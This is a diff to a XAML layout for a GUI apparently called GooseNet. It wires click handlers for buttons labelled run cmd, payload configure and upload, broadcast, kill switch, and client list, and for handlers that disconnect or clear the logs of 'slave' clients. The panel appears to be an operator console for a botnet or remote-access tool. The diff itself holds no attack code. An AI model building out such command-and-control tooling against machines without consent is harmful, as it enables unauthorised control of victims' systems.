@@ -60,35 +60,29 @@
                     </Paragraph>
                 </FlowDocument>
             </RichTextBox>
-            <RichTextBox x:Name="richTextBox1" Height="23" Width="519" HorizontalAlignment="Left" Canvas.Top="101" VerticalAlignment="Center" Canvas.Left="260">
-                <FlowDocument>
-                    <Paragraph>
-                        <Run Text=""/>
-                    </Paragraph>
-                </FlowDocument>
-            </RichTextBox>
             <Label x:Name="client_number_label" Content="Client Id:" Canvas.Left="12" Canvas.Top="97" Foreground="White" HorizontalAlignment="Left" VerticalAlignment="Top" FontSize="14"/>
             <TextBox x:Name="client_id_textbox" Canvas.Left="87" TextWrapping="NoWrap" Canvas.Top="101" Width="74" HorizontalAlignment="Center" VerticalAlignment="Top" Height="21" FontSize="14"/>
             <Button x:Name="configure_server" Content="configure" Canvas.Left="11" Canvas.Top="208" HorizontalAlignment="Center" VerticalAlignment="Top" Width="73" RenderTransformOrigin="0.5,0.503" FontSize="14" Height="23" Click="ConfigureServerClick"/>
             <Button x:Name="kill_server" Content="kill server" Canvas.Left="91" Canvas.Top="180" HorizontalAlignment="Left" VerticalAlignment="Top" Width="70" FontSize="14" Click="KillServerClick"/>
             <Image x:Name="image" Height="188" Canvas.Top="305" Width="244" Source="/GooseNet.png" HorizontalAlignment="Left" VerticalAlignment="Top" Canvas.Left="2"/>
-            <Button x:Name="button" Content="run cmd" Canvas.Left="784" Canvas.Top="101" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="14" Width="74" Height="23"/>
+            <Button x:Name="button" Content="run cmd" Canvas.Left="784" Canvas.Top="101" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="14" Width="74" Height="23" Click="MasterClientRunUserCommand"/>
             <Button x:Name="client_kill_switch" Content="kill switch" Canvas.Left="164" Canvas.Top="125" HorizontalAlignment="Left" VerticalAlignment="Top" Width="74" FontSize="14" Foreground="Red" Height="22"/>
             <Button x:Name="configure_payload" Canvas.Left="10" Canvas.Top="285" HorizontalAlignment="Center" VerticalAlignment="Top" Width="65" Content="configure" FontSize="14" Click="PayloadConfigureButtonClick"/>
             <Button x:Name="payload_upload_view_button" Content="Upload" Canvas.Left="80" Canvas.Top="285" HorizontalAlignment="Center" VerticalAlignment="Top" Width="65" FontSize="14" Click="PayloadUploadClick"/>
             <Label x:Name="label" Content="Payload Options:" Canvas.Top="251" Foreground="White" HorizontalAlignment="Left" VerticalAlignment="Top" FontSize="14"/>
-            <Button x:Name="client_list" Content="client list" Canvas.Left="89" Canvas.Top="209" HorizontalAlignment="Left" VerticalAlignment="Center" Width="72" Height="23" FontSize="14"/>
+            <Button x:Name="client_list" Content="client list" Canvas.Left="89" Canvas.Top="209" HorizontalAlignment="Left" VerticalAlignment="Center" Width="72" Height="23" FontSize="14" Click="MasterClientQueryClientList"/>
             <Label x:Name="client_options_label" Content="Master Client Options:" Foreground="White" HorizontalAlignment="Left" VerticalAlignment="Top" FontSize="14"/>
-            <Button x:Name="client_disconnect" Content="disconnect" Canvas.Left="11" Canvas.Top="125" HorizontalAlignment="Left" VerticalAlignment="Center" Width="74" FontSize="14" Height="22"/>
+            <Button x:Name="client_disconnect" Content="disconnect" Canvas.Left="11" Canvas.Top="125" HorizontalAlignment="Left" VerticalAlignment="Center" Width="74" FontSize="14" Height="22" Click="MasterClientDisconnectSlave"/>
             <Label x:Name="cmd_label" Content="Command:" Canvas.Left="260" Canvas.Top="62" Foreground="White" FontSize="14" HorizontalAlignment="Center" VerticalAlignment="Top"/>
             <Button x:Name="master_client_start" Content="start" Canvas.Left="89" Canvas.Top="29" FontSize="14" HorizontalAlignment="Left" VerticalAlignment="Center" Width="72" Click="MasterClientStart"/>
             <Button x:Name="master_client_configure_button" Content="configure" Canvas.Left="12" Canvas.Top="29" FontSize="14" HorizontalAlignment="Left" VerticalAlignment="Top" Width="72" Click="MasterClientConfigureView"/>
-            <Button x:Name="client_clear_logs" Content="clear logs" Canvas.Left="87" Canvas.Top="125" FontSize="14" HorizontalAlignment="Left" VerticalAlignment="Center" Width="74" Height="22"/>
+            <Button x:Name="client_clear_logs" Content="clear logs" Canvas.Left="87" Canvas.Top="125" FontSize="14" HorizontalAlignment="Left" VerticalAlignment="Center" Width="74" Height="22" Click="MasterClientClearSlaveLog"/>
             <Label x:Name="label1" Canvas.Left="124" Canvas.Top="152"/>
             <Label x:Name="server_options_label" Content="Server Options:" Foreground="White" HorizontalAlignment="Left" Canvas.Left="10" Canvas.Top="147" VerticalAlignment="Top" FontSize="14"/>
             <Label x:Name="target_client_options" Content="Target Client Options:" Canvas.Left="12" Canvas.Top="68" Foreground="White" FontSize="14" HorizontalAlignment="Center" VerticalAlignment="Top"/>
             <CheckBox x:Name="broadcast_checbox" Content="Broadcast" Canvas.Left="164" Canvas.Top="104" Foreground="White" FontSize="14" Click="SlaveClientBroadcastCheckBoxClick"/>
             <Canvas Height="484" Width="900"/>
+            <TextBox x:Name="user_command_textbox" Canvas.Left="260" TextWrapping="Wrap" Canvas.Top="101" Width="519" FontSize="14" HorizontalAlignment="Left" VerticalAlignment="Top" Height="23" KeyDown="MasterClientCommandEnterKeyPress"/>
 
         </Canvas>
         <Canvas x:Name="master_client_configure_canvas" RenderTransformOrigin="0.5,0.5" Background="{DynamicResource AppBackground}" Grid.RowSpan="3">
